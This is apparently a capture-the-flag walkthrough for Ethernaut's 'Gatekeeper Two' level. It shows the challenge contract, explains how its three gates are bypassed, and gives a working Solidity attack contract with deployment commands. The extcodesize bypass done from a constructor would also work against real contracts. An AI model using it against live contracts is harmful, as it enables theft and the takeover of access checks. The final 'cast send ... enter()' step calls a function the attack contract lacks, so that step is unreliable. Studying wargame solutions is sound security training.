## Gatekeeper Two Level Outline

**Difficulty : 6/10**

This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.

```solidity  
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

[Link to level on Ethernaut](https://ethernaut.openzeppelin.com/level/0xdCeA38B2ce1768E1F409B6C65344E81F16bEc38d)

## Solution

To pass the first modifier `gateOne()`, the transaction needs to come from a smart contract.

To pass the second modifier `gateTwo()`, the assembly line `extcodesize(a)` checks the code size as address `a`. To bypass this check, we put our exploit code in the contracts constructor as the contracts code is only stored on the EVM after the constructor finishes calling and setting up it's state. So by calling our exploit in the constructor, `extcodesize` will return 0.

To pass the third modifier `gateThree()`, uses xor cipher to hide a key. But the xor operation has the property 

```
if,
A xor B = C
then,
A xor C = B


uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1
A = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) 
B = uint64(_gateKey) 
C = uint64(0) - 1

so, 
uint64(_gateKey) = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0)-1
```

### Walkthrough

##### 1. Create a new [forge project](https://book.getfoundry.sh/projects/creating-a-new-project.html) with the following contract in `src` 

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Attack {
    constructor(address _gateKeeper) {
        GateKeeper gateKeeper = GateKeeper(_gateKeeper);
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (type(uint64)).max);
        gateKeeper.enter(key);
    }
}

interface GateKeeper {
   function enter(bytes8) external returns(bool);
}
```
> notice how we replaced 'uint64(0)-1' with type(uint64).max

##### 2. 

```console
forge create src/Contract.sol:Attack --constructor-args $LEVEL_ADDRESS --private-key  $PRIVATE_KEY
```

##### 3. Call our newly deployed contract 
```console
cast send $DEPLOYED_ADDRESS "enter()" --private-key=$PRIVATE_KEY 
```
> Replace $DEPLOYED_ADDRESS with the address of your deployed contract

## Further Reading
[0xSage's write up on this level](https://medium.com/coinmonks/ethernaut-lvl-14-gatekeeper-2-walkthrough-how-contracts-initialize-and-how-to-do-bitwise-ddac8ad4f0fd) goes into more depth on these topics


### [:arrow_left: Back To Main Menu](../)
